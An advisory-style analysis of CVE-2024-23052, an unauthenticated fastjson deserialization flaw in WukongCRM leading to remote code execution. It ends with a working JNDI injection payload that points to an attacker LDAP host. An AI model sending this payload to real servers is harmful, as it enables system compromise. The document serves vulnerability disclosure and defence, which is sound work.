Based on the provided content, here's a breakdown of the vulnerability related to CVE-2024-23052:

**Root Cause:**
- The vulnerability stems from the use of an insecure version of the `fastjson` component in the WukongCRM application. Specifically, version 1.2.54 of `fastjson` is vulnerable to deserialization attacks.

**Weaknesses/Vulnerabilities Present:**
- **Insecure Deserialization:** The `fastjson` library's `parseObject()` method is used to process incoming JSON strings, and is vulnerable to deserialization exploits. This allows an attacker to embed malicious code within a JSON string that, when deserialized, leads to remote code execution.
- **Lack of Input Validation:** The application does not adequately sanitize or validate the JSON input, allowing the vulnerable `fastjson` library to process it directly.
- **Insufficient Access Control:** The vulnerability is exploitable without authentication (no Admin-Token required). This is due to problems in the authentication logic of the application.

**Impact of Exploitation:**
- **Remote Command Execution (RCE):** A successful attack results in arbitrary code execution on the server. This allows an attacker to compromise the system, potentially leading to complete control, data theft, or other malicious activities.

**Attack Vectors:**
- The primary attack vector is through HTTP requests to the `/CrmCustomer/queryPageList` endpoint.
- An attacker sends a specially crafted JSON payload within the request body.
- The payload leverages the `fastjson` deserialization vulnerability.

**Required Attacker Capabilities/Position:**
- The attacker needs network access to the WukongCRM server.
- No prior authentication is needed due to an authentication bypass.
- The attacker must be able to send HTTP POST requests with a malicious JSON payload.
- The attacker needs to have knowledge of the vulnerable endpoint (`/CrmCustomer/queryPageList`).
- The attacker also needs to know how to craft a malicious json string to exploit the vulnerability. Specifically, the attacker needs to include the xbean jar package in the target application's classpath, enable `AutoType`, and use `org.apache.xbean.propertyeditor.JndiConverter` to initiate the attack.

**Technical Details:**

- The application calls the `BasePageRequest` constructor to process requests to `/CrmCustomer/queryPageList`.
- Within this process, `fastjson`'s `parseObject()` method is called, parsing a JSON string into a Java bean.
- The vulnerable `fastjson` version allows for the execution of arbitrary code via a crafted JSON payload.
- The provided exploit example uses `org.apache.xbean.propertyeditor.JndiConverter` to trigger a JNDI lookup, which leads to code execution.

**Payload Example:**
```json
{
    "@type":"org.apache.xbean.propertyeditor.JndiConverter",
    "AsText":"ldap://ip:port/Basic/Command/calc"
}
```

This payload initiates a JNDI lookup, which can be exploited to achieve remote code execution. The provided example uses ldap, but other JNDI protocols such as rmi can also be used.
